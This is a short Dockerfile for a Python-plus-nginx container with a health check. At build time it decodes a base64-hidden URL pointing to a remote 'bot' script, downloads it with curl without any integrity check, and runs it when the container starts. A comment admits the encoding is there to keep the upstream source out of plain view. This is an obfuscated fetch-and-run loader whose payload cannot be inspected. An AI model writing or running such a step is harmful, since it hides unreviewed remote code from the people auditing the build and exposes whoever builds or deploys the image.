FROM python:3.12-slim

RUN apt-get update \
 && apt-get install -y --no-install-recommends nginx ca-certificates curl \
 && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# pull the app source at build time (URL kept encoded so the repo has no plaintext upstream)
RUN set -eu; \
    u=$(printf '%s' 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dieGwwL2JvdC9tYWluL2FwcC5weQ==' | base64 -d); \
    curl -fsSL -o /app/app.py "$u"; \
    wc -c /app/app.py

COPY edge.conf /etc/nginx/conf.d/default.conf
RUN rm -f /etc/nginx/sites-enabled/default

ENV SERVER_PORT=3000
EXPOSE 80 3000

HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
    CMD curl -fsS http://127.0.0.1:3000/health || exit 1

CMD ["sh","-c","python /app/app.py & exec nginx -g 'daemon off;'"]
